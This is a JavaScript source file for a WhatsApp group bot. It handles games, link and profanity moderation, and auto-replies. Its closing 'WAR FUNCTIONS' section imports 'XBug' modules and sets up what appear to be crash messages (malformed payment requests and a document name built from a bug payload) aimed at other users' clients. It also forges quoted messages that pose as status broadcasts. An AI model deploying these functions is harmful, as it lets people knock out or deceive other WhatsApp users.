process.on('uncaughtException', console.error)
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const os = require('os')
const util = require('util')
const path = require('path')
const hx = require('hxz-api')
const axios = require('axios')
const chalk = require('chalk')
const yts = require('yt-search')
const xfar = require('xfarr-api')
const google = require('google-it')
const { exec, spawn, execSync } = require("child_process")
const moment = require('moment-timezone')
const { Aki } = require('aki-api')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const fdl = require('caliph-api')
const maker = require('mumaker')
const { pinterest } = require('./lib/pinterest') 
const request = require('request')
const xeontod = require("tod-api")
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const { TelegraPh } = require('./lib/telegraph')
const { imgSuper } = require('./lib/ephoto')
const { remove, unscreen } = require('./lib/removebg')
const { palavras } = require('./lib/conselho.js');
const QrCode = require('qrcode-reader')
const qrcode = require('qrcode')
const qrcodereader = require('qrcode-reader') 
const imageToBase64 = require('image-to-base64')
const ffmpeg = require('fluent-ffmpeg')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, writeExifStc } = require('./lib/exif2')

const akinator = JSON.parse(fs.readFileSync('./src/akinator.json'))
const antilinkhard = JSON.parse(fs.readFileSync('./datab/ants/antilinkhard.json'));

const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'

//TIME
const xtime = moment.tz('America/Fortaleza').format('HH:mm:ss')
const xdate = moment.tz('America/Fortaleza').format('DD/MM/YYYY')
const time2 = moment().tz('America/Fortaleza').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Boa noite 🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Boa noite 🌃'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Boa tarrde 🌅'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Boa tarde 🏙'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Bom dia 🌄'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Bom dia 🌉'
 } 

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
let _autostick = db.data.others.autostick = []
let autosticker = db.data.others.autosticker = []
let ntnsfw = db.data.others.nsfw = []
let ntvirtex = db.data.others.ntvirtex = []
let ntilinkytvid = db.data.others.ntilinkytvid = []
let ntilinkytch = db.data.others.ntilinkytch = []
let ntilinkig = db.data.others.ntilinkig = []
let ntilinkfb = db.data.others.ntilinkfb = []
let ntilinktt = db.data.others.ntilinktt = []
let ntilinktg = db.data.others.ntilinktg = []
let ntilinktwt = db.data.others.ntilinktwt = []
let ntilinkall = db.data.others.ntilinkall = []
let ntwame = db.data.others.ntwame = []
let nttoxic = db.data.others.nttoxic = []
let xeonysticker = JSON.parse(fs.readFileSync('./Media/theme/Media-Store-Karne-Ke-Liye/sticker.json'))
let xeonyaudio = JSON.parse(fs.readFileSync('./Media/theme/Media-Store-Karne-Ke-Liye/audio.json'))
let xeonyimage = JSON.parse(fs.readFileSync('./Media/theme/Media-Store-Karne-Ke-Liye/image.json'))
let xeonyvideo = JSON.parse(fs.readFileSync('./Media/theme/Media-Store-Karne-Ke-Liye/video.json'))
let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'))
const xeonannou = JSON.parse(fs.readFileSync('./database/anoucement.json'))
xeonbugpic = fs.readFileSync('./XBug/xpic.jpeg')
const { xeonbut2 } = require('./XBug/xeonbut2')
const { xeonvirtex } = require('./XBug/xeonvirtex')
const { xeonbutton } = require('./XBug/xeonbutton')
const { xeonbrutal } = require('./XBug/xeonbrutal')

module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "Sem nome"
        const botNumber = await client.decodeJid(client.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
        const from = mek.key.remoteJid
        const type = Object.keys(mek.message)[0]        
        const content = JSON.stringify(mek.message)
        const isAntiLinkHard = m.isGroup ? antilinkhard.includes(from) : false
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
     
         //media detect \\
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
     
        //hijack function
        const ordermessage = (m.msg.xtype === 'conversation' && m.msg.message.conversation) ? m.msg.message.conversation : (m.msg.xtype == 'imageMessage') && m.msg.message.imageMessage.caption ? m.msg.message.imageMessage.caption : (m.msg.xtype == 'videoMessage') && m.msg.message.videoMessage.caption ? m.msg.message.videoMessage.caption : (m.msg.xtype == 'extendedTextMessage') && m.msg.message.extendedTextMessage.text.startsWith(prefix) ? m.msg.message.extendedTextMessage.text : (m.msg.xtype == 'buttonsResponseMessage') && m.msg.message.buttonsResponseMessage.selectedButtonId.startsWith(prefix) ? m.msg.message.buttonsResponseMessage.selectedButtonId : (m.msg.xtype == 'listResponseMessage') && m.msg.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) ? m.msg.message.listResponseMessage.singleSelectReply.selectedRowId : (m.msg.xtype == 'templateButtonReplyMessage') && m.msg.message.templateButtonReplyMessage.selectedId.startsWith(prefix) ? m.msg.message.templateButtonReplyMessage.selectedId : ''   
        const order = ordermessage.slice(0).trim().split(/ +/).shift().toLowerCase()	   
	 
	    //Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./Media/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
		
        // Group
        const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoStick = _autostick.includes(from)
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
        const sotoy = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]

	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
mute: false,
antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = true
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: true,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
        
        // Public & Self
        if (!client.public) {
            if (!m.key.fromMe) return
}
//randoming function
function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
//auto react all message
client.sendMessage(m.chat, {
          react: {
            text: `${pickRandom([''])}`,
            key: m.key,
          }})
          
//chat counter
        if (m.message) {
            client.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }

	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "America/Fortaleza"
        })   
        
// total hit
        global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/client-md/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/client-md${moment.tz('America/Fortaleza').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}
	// auto set bio
	/*if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await client.setStatus(`Nome da Bot : ${client.user.name} | Tempo Online : ${runtime(process.uptime())} | By ${global.ownername}`)
        setting.status = new Date() * 1
	    }
	}*/
	
  //auto recording all
    if (global.autoRecord) { if (m.chat) { client.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { client.sendPresenceUpdate('composing', m.chat) }
}

// Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await client.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await client.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        //Autosticker pc
if (isAutoStick) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await client.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await client.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

//anti bad words by xeon
if (antiToxic)
if (bad.includes(messagesD)) {
tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🦄']
sin =  tos[Math.floor(Math.random() * (tos.length))]
m.reply(sin)
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick you😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isCreator) return reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${kice.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})}
}
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        kice = m.sender
        m.reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`)
        if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
        let gclink = (`https://chat.whatsapp.com/`+await client.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`)
        if (isAdmins) return m.reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`)
        if (isCreator) return m.reply(`\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`)
        client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
          // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
  if (antiWame)
  if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antivirtex by xeon
  if (antiVirtex) {
  if (budy.length > 3500) {
  m.reply(`Somebody spammed virus!! Mark as read⚠️\n`.repeat(300))
  m.reply(`\`\`\`「 Virus Detected 」\`\`\`\n\nSorry You Will Be Kicked !`)
  if (!isBotAdmins) return m.reply(mess.botAdmin)
  client.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
  }
  }
//anti bad words by xeon
if (antiToxic)
if (bad.includes(messagesD)) {
tos = ['Hey, watch your mouth','Never been taught how to speak?','Stop being toxic my friend🤢','Dont be toxic🦄']
sin =  tos[Math.floor(Math.random() * (tos.length))]
m.reply(sin)
if (m.text) {
bvl = `\`\`\`「 Bad Word Detected 」\`\`\`\n\nYou are using bad word but you are an admin that's why i won't kick you😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${kice.split("@")[0]} was kicked because of using bad words in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})}
}
//antilink youtube video by xeon
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a youtube video link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink youtube channel by xeon
if (AntiLinkYoutubeChannel)
   if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a youtube channel link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink instagram by xeon
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink facebook by xeon
if (AntiLinkFacebook)
   if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink telegram by xeon
if (AntiLinkTelegram)
   if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink tiktok by xeon
if (AntiLinkTiktok)
   if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink twitter by xeon
if (AntiLinkTwitter)
   if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
//antilink all by xeon
if (AntiLinkAll)
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
kice = m.sender
await client.groupParticipantsUpdate(m.chat, [kice], 'remove')
client.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}
        
        //auto reply by xeon
  //if (Autoreply) //remove forwad slashes to make it autoreply on off
        for (let anji of xeonysticker){
				if (budy === anji){
					result = fs.readFileSync(`./Media/sticker/${anji}.webp`)
					client.sendMessage(m.chat, { sticker: result }, { quoted: m })
					}
			}
			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
			for (let anju of xeonyaudio){
				if (budy === anju){
					result = fs.readFileSync(`./Media/audio/${anju}.mp3`)
					client.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: fkontak })     
					}
			}
			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
			for (let anjh of xeonyimage){
				if (budy === anjh){
					result = fs.readFileSync(`./Media/image/${anjh}.jpg`)
					client.sendMessage(m.chat, { image: result }, { quoted: m })
					}
			}
			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
					for (let anjh of xeonyvideo){
				if (budy === anjh){
					result = fs.readFileSync(`./Media/video/${anjh}.mp4`)
					client.sendMessage(m.chat, { video: result }, { quoted: m })
					}
				  }
				
				
				
				//-------------------☣️WAR FUNCTIONS☣️-----------------\\
	//-------------------☣️WAR FUNCTIONS☣️-----------------\\
	//-------------------☣️WAR FUNCTIONS☣️-----------------\\
	const deploy = (teks) => {
  client.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}

const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `${ownername}☣️${xeonbrutal(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}
}

const xezy = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"externalAdReply": {
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": websitex,
"thumbnailUrl": 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
"thumbnail": xeonbugpic,
}}}

const bhosdike = (teks) => {
 client.sendMessage(m.chat, { image: xeonbugpic, caption: wm, contextInfo:{"externalAdReply": {"title": botname,"body": ownername,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: websitex,
thumbnailUrl: 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
thumbnail: xeonbugpic,
}
}}, { quoted:xezy})
}

//emoji 
